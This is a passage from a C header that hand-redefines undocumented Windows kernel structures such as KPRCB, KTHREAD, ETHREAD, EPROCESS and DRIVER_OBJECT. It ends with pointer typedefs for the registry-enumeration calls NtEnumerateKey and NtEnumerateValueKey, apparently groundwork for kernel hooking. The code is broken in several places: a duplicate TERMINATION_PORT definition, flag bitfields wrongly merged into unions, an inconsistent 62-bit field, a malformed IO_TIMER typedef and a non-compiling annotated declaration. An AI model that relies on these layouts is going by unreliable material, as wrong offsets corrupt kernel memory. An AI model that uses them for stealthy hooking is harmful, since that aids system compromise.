     PKSPIN_LOCK_QUEUE Next;
     ULONG * Lock;
} KSPIN_LOCK_QUEUE, *PKSPIN_LOCK_QUEUE;

typedef struct _CACHED_KSTACK_LIST
{
     SLIST_HEADER SListHead;
     LONG MinimumFree;
     ULONG Misses;
     ULONG MissesLast;
} CACHED_KSTACK_LIST, *PCACHED_KSTACK_LIST;

typedef struct _KPROCESSOR_STATE
{
     CONTEXT ContextFrame;
     KSPECIAL_REGISTERS SpecialRegisters;
} KPROCESSOR_STATE, *PKPROCESSOR_STATE;

typedef struct _GENERAL_LOOKASIDE_POOL
{
     union
     {
          SLIST_HEADER ListHead;
          SINGLE_LIST_ENTRY SingleListHead;
     };
     WORD Depth;
     WORD MaximumDepth;
     ULONG TotalAllocates;
     union
     {
          ULONG AllocateMisses;
          ULONG AllocateHits;
     };
     ULONG TotalFrees;
     union
     {
          ULONG FreeMisses;
          ULONG FreeHits;
     };
     POOL_TYPE Type;
     ULONG Tag;
     ULONG Size;
     union
     {
          PVOID * AllocateEx;
          PVOID * Allocate;
     };
     union
     {
          PVOID FreeEx;
          PVOID Free;
     };
     LIST_ENTRY ListEntry;
     ULONG LastTotalAllocates;
     union
     {
          ULONG LastAllocateMisses;
          ULONG LastAllocateHits;
     };
     ULONG Future[2];
} GENERAL_LOOKASIDE_POOL, *PGENERAL_LOOKASIDE_POOL;

typedef struct _FAST_IO_DISPATCH {
    ULONG SizeOfFastIoDispatch;
    PVOID FastIoCheckIfPossible;
    PVOID FastIoRead;
    PVOID FastIoWrite;
    PVOID FastIoQueryBasicInfo;
    PVOID FastIoQueryStandardInfo;
} FAST_IO_DISPATCH, *PFAST_IO_DISPATCH;

typedef struct _IRP IRP, *PIRP;

typedef struct _VPB {
    SHORT Type;
    SHORT Size;
    USHORT Flags;
    USHORT VolumeLabelLength;
    WCHAR VolumeLabel[32];
} VPB, *PVPB;

typedef struct _KDEVICE_QUEUE {
    SHORT Type;
    SHORT Size;
    LIST_ENTRY DeviceListHead;
    ULONG Lock;
    BOOLEAN Busy;
} KDEVICE_QUEUE, *PKDEVICE_QUEUE;

typedef struct _DEVOBJ_EXTENSION {
    CSHORT Type;
    USHORT Size;
    PDEVICE_OBJECT DeviceObject;
} DEVOBJ_EXTENSION, *PDEVOBJ_EXTENSION;

typedef struct _PSP_RATE_APC {
    KAPC Apc;
    KTIMER Timer;
    PVOID Thread;
    ULONG Rate;
} PSP_RATE_APC, *PPSP_RATE_APC;

typedef struct _MMSUPPORT {
    ULONG VmWorkingSetList;
    ULONG Flags;
    ULONG PageFaultCount;
    ULONG PeakWorkingSetSize;
    ULONG WorkingSetSize;
    ULONG MinimumWorkingSetSize;
    ULONG MaximumWorkingSetSize;
    ULONG ChargedWslePages;
    ULONG ActualWslePages;
    ULONG WorkingSetExpansionLinks;
} MMSUPPORT, *PMMSUPPORT;

typedef struct _MM_AVL_NODE {
    struct _MM_AVL_NODE* LeftChild;
    struct _MM_AVL_NODE* RightChild;
    ULONG_PTR Balance : 2;
    ULONG_PTR Parent : 62;
} MM_AVL_NODE, *PMM_AVL_NODE;

typedef struct _MM_AVL_TABLE {
    MM_AVL_NODE BalancedRoot;
    PVOID NodeHint;
    ULONG NumberGenericTableElements;
} MM_AVL_TABLE, *PMM_AVL_TABLE;


typedef struct _IO_CLIENT_EXTENSION {
    struct _IO_CLIENT_EXTENSION* NextExtension;
    GUID ClientIdentification;
} IO_CLIENT_EXTENSION, *PIO_CLIENT_EXTENSION;

typedef struct _FS_FILTER_CALLBACKS {
    ULONG SizeOfFsFilterCallbacks;
    PVOID PreAcquireForSectionSynchronization;
    PVOID PostAcquireForSectionSynchronization;
} FS_FILTER_CALLBACKS, *PFS_FILTER_CALLBACKS;


typedef struct _KNODE
{
     SLIST_HEADER PagedPoolSListHead;
     SLIST_HEADER NonPagedPoolSListHead[3];
     SLIST_HEADER PfnDereferenceSListHead;
     ULONG ProcessorMask;
     UCHAR Color;
     UCHAR Seed;
     UCHAR NodeNumber;
     _flags Flags;
     ULONG MmShiftedColor;
     ULONG FreeCount[2];
     PSINGLE_LIST_ENTRY PfnDeferredList;
     CACHED_KSTACK_LIST CachedKernelStacks;
} KNODE, *PKNODE;

typedef struct 
{
     LONG * IdleHandler;
     ULONG Context;
     ULONG Latency;
     ULONG Power;
     ULONG TimeCheck;
     ULONG StateFlags;
     UCHAR PromotePercent;
     UCHAR DemotePercent;
     UCHAR PromotePercentBase;
     UCHAR DemotePercentBase;
     UCHAR StateType;
} PPM_IDLE_STATE, *PPPM_IDLE_STATE;

typedef struct 
{
     ULONG Type;
     ULONG Count;
     ULONG Flags;
     ULONG TargetState;
     ULONG ActualState;
     ULONG OldState;
     ULONG TargetProcessors;
     PPM_IDLE_STATE State[1];
} PPM_IDLE_STATES, *PPPM_IDLE_STATES;

typedef struct 
{
     UINT64 StartTime;
     UINT64 EndTime;
     ULONG Reserved[4];
} PROCESSOR_IDLE_TIMES, *PPROCESSOR_IDLE_TIMES;

typedef struct 
{
     ULONG Frequency;
     ULONG Power;
     UCHAR PercentFrequency;
     UCHAR IncreaseLevel;
     UCHAR DecreaseLevel;
     UCHAR Type;
     UINT64 Control;
     UINT64 Status;
     ULONG TotalHitCount;
     ULONG DesiredCount;
} PPM_PERF_STATE, *PPPM_PERF_STATE;

typedef struct 
{
     ULONG Count;
     ULONG MaxFrequency;
     ULONG MaxPerfState;
     ULONG MinPerfState;
     ULONG LowestPState;
     ULONG IncreaseTime;
     ULONG DecreaseTime;
     UCHAR BusyAdjThreshold;
     UCHAR Reserved;
     UCHAR ThrottleStatesOnly;
     UCHAR PolicyType;
     ULONG TimerInterval;
     ULONG Flags;
     ULONG TargetProcessors;
     LONG * PStateHandler;
     ULONG PStateContext;
     LONG * TStateHandler;
     ULONG TStateContext;
     unsigned int* FeedbackHandler;
     PPM_PERF_STATE State[1];
} PPM_PERF_STATES, *PPPM_PERF_STATES;

typedef struct _PROCESSOR_POWER_STATE
{
     PVOID IdleFunction;
     PPPM_IDLE_STATES IdleStates;
     UINT64 LastTimeCheck;
     UINT64 LastIdleTime;
     PROCESSOR_IDLE_TIMES IdleTimes;
     PPPM_IDLE_ACCOUNTING IdleAccounting;
     PPPM_PERF_STATES PerfStates;
     ULONG LastKernelUserTime;
     ULONG LastIdleThreadKTime;
     UINT64 LastGlobalTimeHv;
     UINT64 LastProcessorTimeHv;
     UCHAR ThermalConstraint;
     UCHAR LastBusyPercentage;
     BYTE Flags[6];
     KTIMER PerfTimer;
     KDPC PerfDpc;
     ULONG LastSysTime;
     PKPRCB PStateMaster;
     ULONG PStateSet;
     ULONG CurrentPState;
     ULONG Reserved0;
     ULONG DesiredPState;
     ULONG Reserved1;
     ULONG PStateIdleStartTime;
     ULONG PStateIdleTime;
     ULONG LastPStateIdleTime;
     ULONG PStateStartTime;
     ULONG WmiDispatchPtr;
     LONG WmiInterfaceEnabled;
} PROCESSOR_POWER_STATE, *PPROCESSOR_POWER_STATE;

typedef struct _KDPC_DATA
{
     LIST_ENTRY DpcListHead;
     ULONG DpcLock;
     LONG DpcQueueDepth;
     ULONG DpcCount;
} KDPC_DATA, *PKDPC_DATA;

typedef struct _FX_SAVE_AREA
{
     BYTE U[520];
     ULONG NpxSavedCpu;
     ULONG Cr0NpxState;
} FX_SAVE_AREA, *PFX_SAVE_AREA;


typedef struct _KPRCB
{
     WORD MinorVersion;
     WORD MajorVersion;
     PKTHREAD CurrentThread;
     PKTHREAD NextThread;
     PKTHREAD IdleThread;
     UCHAR Number;
     UCHAR NestingLevel;
     WORD BuildType;
     ULONG SetMember;
     CHAR CpuType;
     CHAR CpuID;
     union
     {
          WORD CpuStep;
          struct
          {
               UCHAR CpuStepping;
               UCHAR CpuModel;
          };
     };
     KPROCESSOR_STATE ProcessorState;
     ULONG KernelReserved[16];
     ULONG HalReserved[16];
     ULONG CFlushSize;
     UCHAR PrcbPad0[88];
     KSPIN_LOCK_QUEUE LockQueue[33];
     PKTHREAD NpxThread;
     ULONG InterruptCount;
     ULONG KernelTime;
     ULONG UserTime;
     ULONG DpcTime;
     ULONG DpcTimeCount;
     ULONG InterruptTime;
     ULONG AdjustDpcThreshold;
     ULONG PageColor;
     UCHAR SkipTick;
     UCHAR DebuggerSavedIRQL;
     UCHAR NodeColor;
     UCHAR PollSlot;
     ULONG NodeShiftedColor;
     PKNODE ParentNode;
     ULONG MultiThreadProcessorSet;
     PKPRCB MultiThreadSetMaster;
     ULONG SecondaryColorMask;
     ULONG DpcTimeLimit;
     ULONG CcFastReadNoWait;
     ULONG CcFastReadWait;
     ULONG CcFastReadNotPossible;
     ULONG CcCopyReadNoWait;
     ULONG CcCopyReadWait;
     ULONG CcCopyReadNoWaitMiss;
     LONG MmSpinLockOrdering;
     LONG IoReadOperationCount;
     LONG IoWriteOperationCount;
     LONG IoOtherOperationCount;
     LARGE_INTEGER IoReadTransferCount;
     LARGE_INTEGER IoWriteTransferCount;
     LARGE_INTEGER IoOtherTransferCount;
     ULONG CcFastMdlReadNoWait;
     ULONG CcFastMdlReadWait;
     ULONG CcFastMdlReadNotPossible;
     ULONG CcMapDataNoWait;
     ULONG CcMapDataWait;
     ULONG CcPinMappedDataCount;
     ULONG CcPinReadNoWait;
     ULONG CcPinReadWait;
     ULONG CcMdlReadNoWait;
     ULONG CcMdlReadWait;
     ULONG CcLazyWriteHotSpots;
     ULONG CcLazyWriteIos;
     ULONG CcLazyWritePages;
     ULONG CcDataFlushes;
     ULONG CcDataPages;
     ULONG CcLostDelayedWrites;
     ULONG CcFastReadResourceMiss;
     ULONG CcCopyReadWaitMiss;
     ULONG CcFastMdlReadResourceMiss;
     ULONG CcMapDataNoWaitMiss;
     ULONG CcMapDataWaitMiss;
     ULONG CcPinReadNoWaitMiss;
     ULONG CcPinReadWaitMiss;
     ULONG CcMdlReadNoWaitMiss;
     ULONG CcMdlReadWaitMiss;
     ULONG CcReadAheadIos;
     ULONG KeAlignmentFixupCount;
     ULONG KeExceptionDispatchCount;
     ULONG KeSystemCalls;
     ULONG PrcbPad1[3];
     PP_LOOKASIDE_LIST PPLookasideList[16];
     GENERAL_LOOKASIDE_POOL PPNPagedLookasideList[32];
     GENERAL_LOOKASIDE_POOL PPPagedLookasideList[32];
     ULONG PacketBarrier;
     LONG ReverseStall;
     PVOID IpiFrame;
     UCHAR PrcbPad2[52];
     VOID * CurrentPacket[3];
     ULONG TargetSet;
     PVOID WorkerRoutine;
     ULONG IpiFrozen;
     UCHAR PrcbPad3[40];
     ULONG RequestSummary;
     PKPRCB SignalDone;
     UCHAR PrcbPad4[56];
     KDPC_DATA DpcData[2];
     PVOID DpcStack;
     LONG MaximumDpcQueueDepth;
     ULONG DpcRequestRate;
     ULONG MinimumDpcRate;
     UCHAR DpcInterruptRequested;
     UCHAR DpcThreadRequested;
     UCHAR DpcRoutineActive;
     UCHAR DpcThreadActive;
     ULONG PrcbLock;
     ULONG DpcLastCount;
     ULONG TimerHand;
     ULONG TimerRequest;
     PVOID PrcbPad41;
     KEVENT DpcEvent;
     UCHAR ThreadDpcEnable;
     UCHAR QuantumEnd;
     UCHAR PrcbPad50;
     UCHAR IdleSchedule;
     LONG DpcSetEventRequest;
     LONG Sleeping;
     ULONG PeriodicCount;
     ULONG PeriodicBias;
     UCHAR PrcbPad5[6];
     LONG TickOffset;
     KDPC CallDpc;
     LONG ClockKeepAlive;
     UCHAR ClockCheckSlot;
     UCHAR ClockPollCycle;
     UCHAR PrcbPad6[2];
     LONG DpcWatchdogPeriod;
     LONG DpcWatchdogCount;
     LONG ThreadWatchdogPeriod;
     LONG ThreadWatchdogCount;
     ULONG PrcbPad70[2];
     LIST_ENTRY WaitListHead;
     ULONG WaitLock;
     ULONG ReadySummary;
     ULONG QueueIndex;
     SINGLE_LIST_ENTRY DeferredReadyListHead;
     UINT64 StartCycles;
     UINT64 CycleTime;
     UINT64 PrcbPad71[3];
     LIST_ENTRY DispatcherReadyListHead[32];
     PVOID ChainedInterruptList;
     LONG LookasideIrpFloat;
     LONG MmPageFaultCount;
     LONG MmCopyOnWriteCount;
     LONG MmTransitionCount;
     LONG MmCacheTransitionCount;
     LONG MmDemandZeroCount;
     LONG MmPageReadCount;
     LONG MmPageReadIoCount;
     LONG MmCacheReadCount;
     LONG MmCacheIoCount;
     LONG MmDirtyPagesWriteCount;
     LONG MmDirtyWriteIoCount;
     LONG MmMappedPagesWriteCount;
     LONG MmMappedWriteIoCount;
     ULONG CachedCommit;
     ULONG CachedResidentAvailable;
     PVOID HyperPte;
     UCHAR CpuVendor;
     UCHAR PrcbPad9[3];
     UCHAR VendorString[13];
     UCHAR InitialApicId;
     UCHAR CoresPerPhysicalProcessor;
     UCHAR LogicalProcessorsPerPhysicalProcessor;
     ULONG MHz;
     ULONG FeatureBits;
     LARGE_INTEGER UpdateSignature;
     UINT64 IsrTime;
     UINT64 SpareField1;
     FX_SAVE_AREA NpxSaveArea;
     PROCESSOR_POWER_STATE PowerState;
     KDPC DpcWatchdogDpc;
     KTIMER DpcWatchdogTimer;
     PVOID WheaInfo;
     PVOID EtwSupport;
     SLIST_HEADER InterruptObjectPool;
     LARGE_INTEGER HypercallPagePhysical;
     PVOID HypercallPageVirtual;
     PVOID RateControl;
     CACHE_DESCRIPTOR Cache[5];
     ULONG CacheCount;
     ULONG CacheProcessorMask[5];
     UCHAR LogicalProcessorsPerCore;
     UCHAR PrcbPad8[3];
     ULONG PackageProcessorSet;
     ULONG CoreProcessorSet;
} KPRCB, *PKPRCB;

typedef struct _KSEMAPHORE
{
     DISPATCHER_HEADER Header;
     LONG Limit;
} KSEMAPHORE, *PKSEMAPHORE;

typedef struct _KTHREAD
{
     DISPATCHER_HEADER Header;
     UINT64 CycleTime;
     ULONG HighCycleTime;
     UINT64 QuantumTarget;
     PVOID InitialStack;
     PVOID StackLimit;
     PVOID KernelStack;
     ULONG ThreadLock;
     union
     {
          KAPC_STATE ApcState;
          UCHAR ApcStateFill[23];
     };
     CHAR Priority;
     WORD NextProcessor;
     WORD DeferredProcessor;
     ULONG ApcQueueLock;
     ULONG ContextSwitches;
     UCHAR State;
     UCHAR NpxState;
     UCHAR WaitIrql;
     CHAR WaitMode;
     LONG WaitStatus;
     union
     {
          PKWAIT_BLOCK WaitBlockList;
          PKGATE GateObject;
     };
     union
     {
          ULONG KernelStackResident: 1;
          ULONG ReadyTransition: 1;
          ULONG ProcessReadyQueue: 1;
          ULONG WaitNext: 1;
          ULONG SystemAffinityActive: 1;
          ULONG Alertable: 1;
          ULONG GdiFlushActive: 1;
          ULONG Reserved: 25;
          LONG MiscFlags;
     };
     UCHAR WaitReason;
     UCHAR SwapBusy;
     UCHAR Alerted[2];
     union
     {
          LIST_ENTRY WaitListEntry;
          SINGLE_LIST_ENTRY SwapListEntry;
     };
     PKQUEUE Queue;
     ULONG WaitTime;
     union
     {
          struct
          {
               SHORT KernelApcDisable;
               SHORT SpecialApcDisable;
          };
          ULONG CombinedApcDisable;
     };
     PVOID Teb;
     union
     {
          KTIMER Timer;
          UCHAR TimerFill[40];
     };
     union
     {
          ULONG AutoAlignment: 1;
          ULONG DisableBoost: 1;
          ULONG EtwStackTraceApc1Inserted: 1;
          ULONG EtwStackTraceApc2Inserted: 1;
          ULONG CycleChargePending: 1;
          ULONG CalloutActive: 1;
          ULONG ApcQueueable: 1;
          ULONG EnableStackSwap: 1;
          ULONG GuiThread: 1;
          ULONG ReservedFlags: 23;
          LONG ThreadFlags;
     };
     union
     {
          KWAIT_BLOCK WaitBlock[4];
          struct
          {
               UCHAR WaitBlockFill0[23];
               UCHAR IdealProcessor;
          };
          struct
          {
               UCHAR WaitBlockFill1[47];
               CHAR PreviousMode;
          };
          struct
          {
               UCHAR WaitBlockFill2[71];
               UCHAR ResourceIndex;
          };
          UCHAR WaitBlockFill3[95];
     };
     UCHAR LargeStack;
     LIST_ENTRY QueueListEntry;
     PKTRAP_FRAME TrapFrame;
     PVOID FirstArgument;
     union
     {
          PVOID CallbackStack;
          ULONG CallbackDepth;
     };
     PVOID ServiceTable;
     UCHAR ApcStateIndex;
     CHAR BasePriority;
     CHAR PriorityDecrement;
     UCHAR Preempted;
     UCHAR AdjustReason;
     CHAR AdjustIncrement;
     UCHAR Spare01;
     CHAR Saturation;
     ULONG SystemCallNumber;
     ULONG Spare02;
     ULONG UserAffinity;
     PKPROCESS Process;
     ULONG Affinity;
     PKAPC_STATE ApcStatePointer[2];
     union
     {
          KAPC_STATE SavedApcState;
          UCHAR SavedApcStateFill[23];
     };
     CHAR FreezeCount;
     CHAR SuspendCount;
     UCHAR UserIdealProcessor;
     UCHAR Spare03;
     UCHAR Iopl;
     PVOID Win32Thread;
     PVOID StackBase;
     union
     {
          KAPC SuspendApc;
          struct
          {
               UCHAR SuspendApcFill0[1];
               CHAR Spare04;
          };
          struct
          {
               UCHAR SuspendApcFill1[3];
               UCHAR QuantumReset;
          };
          struct
          {
               UCHAR SuspendApcFill2[4];
               ULONG KernelTime;
          };
          struct
          {
               UCHAR SuspendApcFill3[36];
               PKPRCB WaitPrcb;
          };
          struct
          {
               UCHAR SuspendApcFill4[40];
               PVOID LegoData;
          };
          UCHAR SuspendApcFill5[47];
     };
     UCHAR PowerState;
     ULONG UserTime;
     union
     {
          KSEMAPHORE SuspendSemaphore;
          UCHAR SuspendSemaphorefill[20];
     };
     ULONG SListFaultCount;
     LIST_ENTRY ThreadListEntry;
     LIST_ENTRY MutantListHead;
     PVOID SListFaultAddress;
     PVOID MdlForLockedTeb;
} KTHREAD, *PKTHREAD;

typedef struct _TERMINATION_PORT
{
     PTERMINATION_PORT Next;
     PVOID Port;
} TERMINATION_PORT, *PTERMINATION_PORT;

typedef struct _PS_CLIENT_SECURITY_CONTEXT
{
     union
     {
          ULONG ImpersonationData;
          PVOID ImpersonationToken;
          ULONG ImpersonationLevel: 2;
          ULONG EffectiveOnly: 1;
     };
} PS_CLIENT_SECURITY_CONTEXT, *PPS_CLIENT_SECURITY_CONTEXT;

typedef struct _TERMINATION_PORT {
    struct _TERMINATION_PORT* Next;
    PVOID Port;
} TERMINATION_PORT, *PTERMINATION_PORT;

typedef struct _flags {
    UCHAR NodeColor;
    UCHAR MmFlags;
    UCHAR Removable;
    UCHAR MemoryReserved;
} FLAGS, *PFLAGS;


typedef struct _DRIVER_OBJECT
{
     SHORT Type;
     SHORT Size;
     PDEVICE_OBJECT DeviceObject;
     ULONG Flags;
     PVOID DriverStart;
     ULONG DriverSize;
     PVOID DriverSection;
     PDRIVER_EXTENSION DriverExtension;
     UNICODE_STRING DriverName;
     PUNICODE_STRING HardwareDatabase;
     PFAST_IO_DISPATCH FastIoDispatch;
     LONG * DriverInit;
     PVOID DriverStartIo;
     PVOID DriverUnload;
     LONG * MajorFunction[28];
} DRIVER_OBJECT, *PDRIVER_OBJECT;


typedef struct _DRIVER_EXTENSION
{
     PDRIVER_OBJECT DriverObject;
     LONG * AddDevice;
     ULONG Count;
     UNICODE_STRING ServiceKeyName;
     PIO_CLIENT_EXTENSION ClientDriverExtension;
     PFS_FILTER_CALLBACKS FsFilterCallbacks;
} DRIVER_EXTENSION, *PDRIVER_EXTENSION;


typedef struct _IO_TIMER _IO_TIMER, *PIO_TIMER;

typedef struct _DEVICE_OBJECT
{
     SHORT Type;
     WORD Size;
     LONG ReferenceCount;
     PDRIVER_OBJECT DriverObject;
     PDEVICE_OBJECT NextDevice;
     PDEVICE_OBJECT AttachedDevice;
     PIRP CurrentIrp;
     PIO_TIMER Timer;
     ULONG Flags;
     ULONG Characteristics;
     PVPB Vpb;
     PVOID DeviceExtension;
     ULONG DeviceType;
     CHAR StackSize;
     BYTE Queue[40];
     ULONG AlignmentRequirement;
     KDEVICE_QUEUE DeviceQueue;
     KDPC Dpc;
     ULONG ActiveThreadCount;
     PVOID SecurityDescriptor;
     KEVENT DeviceLock;
     WORD SectorSize;
     WORD Spare1;
     PDEVOBJ_EXTENSION DeviceObjectExtension;
     PVOID Reserved;
} DEVICE_OBJECT, *PDEVICE_OBJECT;

typedef struct _ETHREAD
{
     KTHREAD Tcb;
     LARGE_INTEGER CreateTime;
     union
     {
          LARGE_INTEGER ExitTime;
          LIST_ENTRY KeyedWaitChain;
     };
     union
     {
          LONG ExitStatus;
          PVOID OfsChain;
     };
     union
     {
          LIST_ENTRY PostBlockList;
          struct
          {
               PVOID ForwardLinkShadow;
               PVOID StartAddress;
          };
     };
     union
     {
          PTERMINATION_PORT TerminationPort;
          PETHREAD ReaperLink;
          PVOID KeyedWaitValue;
          PVOID Win32StartParameter;
     };
     ULONG ActiveTimerListLock;
     LIST_ENTRY ActiveTimerListHead;
     CLIENT_ID Cid;
     union
     {
          KSEMAPHORE KeyedWaitSemaphore;
          KSEMAPHORE AlpcWaitSemaphore;
     };
     PS_CLIENT_SECURITY_CONTEXT ClientSecurity;
     LIST_ENTRY IrpList;
     ULONG TopLevelIrp;
     PDEVICE_OBJECT DeviceToVerify;
     _PSP_RATE_APC * RateControlApc;
     PVOID Win32StartAddress;
     PVOID SparePtr0;
     LIST_ENTRY ThreadListEntry;
     EX_RUNDOWN_REF RundownProtect;
     EX_PUSH_LOCK ThreadLock;
     ULONG ReadClusterSize;
     LONG MmLockOrdering;
     ULONG CrossThreadFlags;
     ULONG Terminated: 1;
     ULONG ThreadInserted: 1;
     ULONG HideFromDebugger: 1;
     ULONG ActiveImpersonationInfo: 1;
     ULONG SystemThread: 1;
     ULONG HardErrorsAreDisabled: 1;
     ULONG BreakOnTermination: 1;
     ULONG SkipCreationMsg: 1;
     ULONG SkipTerminationMsg: 1;
     ULONG CopyTokenOnOpen: 1;
     ULONG ThreadIoPriority: 3;
     ULONG ThreadPagePriority: 3;
     ULONG RundownFail: 1;
     ULONG SameThreadPassiveFlags;
     ULONG ActiveExWorker: 1;
     ULONG ExWorkerCanWaitUser: 1;
     ULONG MemoryMaker: 1;
     ULONG ClonedThread: 1;
     ULONG KeyedEventInUse: 1;
     ULONG RateApcState: 2;
     ULONG SelfTerminate: 1;
     ULONG SameThreadApcFlags;
     ULONG Spare: 1;
     ULONG StartAddressInvalid: 1;
     ULONG EtwPageFaultCalloutActive: 1;
     ULONG OwnsProcessWorkingSetExclusive: 1;
     ULONG OwnsProcessWorkingSetShared: 1;
     ULONG OwnsSystemWorkingSetExclusive: 1;
     ULONG OwnsSystemWorkingSetShared: 1;
     ULONG OwnsSessionWorkingSetExclusive: 1;
     ULONG OwnsSessionWorkingSetShared: 1;
     ULONG OwnsProcessAddressSpaceExclusive: 1;
     ULONG OwnsProcessAddressSpaceShared: 1;
     ULONG SuppressSymbolLoad: 1;
     ULONG Prefetching: 1;
     ULONG OwnsDynamicMemoryShared: 1;
     ULONG OwnsChangeControlAreaExclusive: 1;
     ULONG OwnsChangeControlAreaShared: 1;
     ULONG PriorityRegionActive: 4;
     UCHAR CacheManagerActive;
     UCHAR DisablePageFaultClustering;
     UCHAR ActiveFaultCount;
     ULONG AlpcMessageId;
     union
     {
          PVOID AlpcMessage;
          ULONG AlpcReceiveAttributeSet;
     };
     LIST_ENTRY AlpcWaitListEntry;
     ULONG CacheManagerCount;
} ETHREAD, *PETHREAD;

typedef struct _EPROCESS
{
     KPROCESS Pcb;
     EX_PUSH_LOCK ProcessLock;
     LARGE_INTEGER CreateTime;
     LARGE_INTEGER ExitTime;
     EX_RUNDOWN_REF RundownProtect;
     PVOID UniqueProcessId;
     LIST_ENTRY ActiveProcessLinks;
     ULONG QuotaUsage[3];
     ULONG QuotaPeak[3];
     ULONG CommitCharge;
     ULONG PeakVirtualSize;
     ULONG VirtualSize;
     LIST_ENTRY SessionProcessLinks;
     PVOID DebugPort;
     union
     {
          PVOID ExceptionPortData;
          ULONG ExceptionPortValue;
          ULONG ExceptionPortState: 3;
     };
     PHANDLE_TABLE ObjectTable;
     EX_FAST_REF Token;
     ULONG WorkingSetPage;
     EX_PUSH_LOCK AddressCreationLock;
     PETHREAD RotateInProgress;
     PETHREAD ForkInProgress;
     ULONG HardwareTrigger;
     PMM_AVL_TABLE PhysicalVadRoot;
     PVOID CloneRoot;
     ULONG NumberOfPrivatePages;
     ULONG NumberOfLockedPages;
     PVOID Win32Process;
     PEJOB Job;
     PVOID SectionObject;
     PVOID SectionBaseAddress;
     _EPROCESS_QUOTA_BLOCK * QuotaBlock;
     _PAGEFAULT_HISTORY * WorkingSetWatch;
     PVOID Win32WindowStation;
     PVOID InheritedFromUniqueProcessId;
     PVOID LdtInformation;
     PVOID VadFreeHint;
     PVOID VdmObjects;
     PVOID DeviceMap;
     PVOID EtwDataSource;
     PVOID FreeTebHint;
     union
     {
          HARDWARE_PTE PageDirectoryPte;
          UINT64 Filler;
     };
     PVOID Session;
     UCHAR ImageFileName[16];
     LIST_ENTRY JobLinks;
     PVOID LockedPagesList;
     LIST_ENTRY ThreadListHead;
     PVOID SecurityPort;
     PVOID PaeTop;
     ULONG ActiveThreads;
     ULONG ImagePathHash;
     ULONG DefaultHardErrorProcessing;
     LONG LastThreadExitStatus;
     PPEB Peb;
     EX_FAST_REF PrefetchTrace;
     LARGE_INTEGER ReadOperationCount;
     LARGE_INTEGER WriteOperationCount;
     LARGE_INTEGER OtherOperationCount;
     LARGE_INTEGER ReadTransferCount;
     LARGE_INTEGER WriteTransferCount;
     LARGE_INTEGER OtherTransferCount;
     ULONG CommitChargeLimit;
     ULONG CommitChargePeak;
     PVOID AweInfo;
     SE_AUDIT_PROCESS_CREATION_INFO SeAuditProcessCreationInfo;
     MMSUPPORT Vm;
     LIST_ENTRY MmProcessLinks;
     ULONG ModifiedPageCount;
     ULONG Flags2;
     ULONG JobNotReallyActive: 1;
     ULONG AccountingFolded: 1;
     ULONG NewProcessReported: 1;
     ULONG ExitProcessReported: 1;
     ULONG ReportCommitChanges: 1;
     ULONG LastReportMemory: 1;
     ULONG ReportPhysicalPageChanges: 1;
     ULONG HandleTableRundown: 1;
     ULONG NeedsHandleRundown: 1;
     ULONG RefTraceEnabled: 1;
     ULONG NumaAware: 1;
     ULONG ProtectedProcess: 1;
     ULONG DefaultPagePriority: 3;
     ULONG PrimaryTokenFrozen: 1;
     ULONG ProcessVerifierTarget: 1;
     ULONG StackRandomizationDisabled: 1;
     ULONG Flags;
     ULONG CreateReported: 1;
     ULONG NoDebugInherit: 1;
     ULONG ProcessExiting: 1;
     ULONG ProcessDelete: 1;
     ULONG Wow64SplitPages: 1;
     ULONG VmDeleted: 1;
     ULONG OutswapEnabled: 1;
     ULONG Outswapped: 1;
     ULONG ForkFailed: 1;
     ULONG Wow64VaSpace4Gb: 1;
     ULONG AddressSpaceInitialized: 2;
     ULONG SetTimerResolution: 1;
     ULONG BreakOnTermination: 1;
     ULONG DeprioritizeViews: 1;
     ULONG WriteWatch: 1;
     ULONG ProcessInSession: 1;
     ULONG OverrideAddressSpace: 1;
     ULONG HasAddressSpace: 1;
     ULONG LaunchPrefetched: 1;
     ULONG InjectInpageErrors: 1;
     ULONG VmTopDown: 1;
     ULONG ImageNotifyDone: 1;
     ULONG PdeUpdateNeeded: 1;
     ULONG VdmAllowed: 1;
     ULONG SmapAllowed: 1;
     ULONG ProcessInserted: 1;
     ULONG DefaultIoPriority: 3;
     ULONG SparePsFlags1: 2;
     LONG ExitStatus;
     WORD Spare7;
     union
     {
          struct
          {
               UCHAR SubSystemMinorVersion;
               UCHAR SubSystemMajorVersion;
          };
          WORD SubSystemVersion;
     };
     UCHAR PriorityClass;
     MM_AVL_TABLE VadRoot;
     ULONG Cookie;
     ALPC_PROCESS_CONTEXT AlpcContext;
} EPROCESS, *PEPROCESS;

typedef struct _MDL
{
     PMDL Next;
     SHORT Size;
     SHORT MdlFlags;
     PEPROCESS Process;
     PVOID MappedSystemVa;
     PVOID StartVa;
     ULONG ByteCount;
     ULONG ByteOffset;
} MDL, *PMDL;



NTSTATUS MmProtectMdlSystemAddress(
  [in] PMDL  MemoryDescriptorList,
  [in] ULONG NewProtect
);


typedef struct _FILE_DIRECTORY_INFORMATION {
  ULONG         NextEntryOffset;
  ULONG         FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG         FileAttributes;
  ULONG         FileNameLength;
  WCHAR         FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;


//NTSYSAPI 
//NTSTATUS
//NTAPI

typedef enum _KEY_INFORMATION_CLASS {
  KeyBasicInformation,
  KeyNodeInformation,
  KeyFullInformation,
  KeyNameInformation,
  KeyCachedInformation,
  KeyFlagsInformation,
  KeyVirtualizationInformation,
  KeyHandleTagsInformation,
  KeyTrustInformation,
  KeyLayerInformation,
  MaxKeyInfoClass
} KEY_INFORMATION_CLASS;


typedef enum _KEY_VALUE_INFORMATION_CLASS {
  KeyValueBasicInformation,
  KeyValueFullInformation,
  KeyValuePartialInformation,
  KeyValueFullInformationAlign64,
  KeyValuePartialInformationAlign64,
  KeyValueLayerInformation,
  MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;


typedef NTSTATUS (NTAPI* NtEnumerateValueKey_t)(

  IN HANDLE               KeyHandle,
  IN ULONG                Index,
  IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
  OUT PVOID               KeyValueInformation,
  IN ULONG                Length,
  OUT PULONG              ResultLength );

typedef NTSTATUS (NTAPI* NtEnumerateKey_t)(



  IN HANDLE               KeyHandle,
  IN ULONG                Index,
  IN KEY_INFORMATION_CLASS KeyInformationClass,
  OUT PVOID               KeyInformation,
  IN ULONG                Length,
  OUT PULONG              ResultLength 
);

